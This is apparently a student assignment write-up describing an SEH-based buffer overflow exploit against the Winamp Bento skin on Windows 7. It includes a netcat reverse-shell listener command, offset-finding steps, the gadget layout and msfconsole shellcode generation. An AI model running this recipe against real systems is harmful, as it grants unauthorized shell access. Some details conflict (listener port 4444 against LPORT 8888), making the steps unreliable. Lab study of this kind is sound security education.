## Introduction
In this assignment, we explore the exception handler mechanism in the Windows 7 operating system. The target is the Winamp media player, specifically the Bento skin script, exploiting an integer overflow vulnerability to gain unauthorized access to the Windows 7 shell.

## Running the Exploit
The exploit worked on a Windows 7 machine using the specified command:
In one terminal:
```bash
$ nc -l -p 4444 -nvv
```
In another terminal:

```bash
$ cd C:\Program Files\Winamp\Skins\Bento\scripts
$ perl exploit.pl > mcvcore.maki
```

Note: [Proof of concept that the exploit works]

## Developing the Exploit
This assignment leverages the Structured Exception Handling (SEH) chain stored on the stack. SEH records are special blocks representing exception handler conditions. Exploiting the vulnerability involves finding the offset to overwrite the first SEH record for Winamp in Windows 7.

## Finding Offset:
Create a pattern with 20,000 "A" characters:

```bash
$ ./pattern_create.rb -l 20000
```
Attach Winamp to WinGDB, run a custom skin with 20,000 "A"s, and identify the SEH record offsets:

```bash
$ ./pattern_offset.rb -q ADDR -l 20000
```
Output of WinGDB when overwriting by 20000 "A"s

## Crafting the Exploit:
Craft the exploit with 16756 "A" bytes, a JMP +4 instruction, and the address of a POP/POP/RET gadget from the "nscrt.dll" library.

Locating the DLL file which contains pop/pop/ret gadget

## Building Shellcode:
Use the msfconsole framework to build shellcode with LPORT set to 8888 and LHOST to 127.0.0.1:

```bash
$ generate -f perl -e x86/alpha_mixed
```
Output shellcode using msfconsole framework

##References and Collaborations
Encountered a problem due to using the wrong payload (windows/x86/shell_reverse_tcp). Watched the videos multiple times.
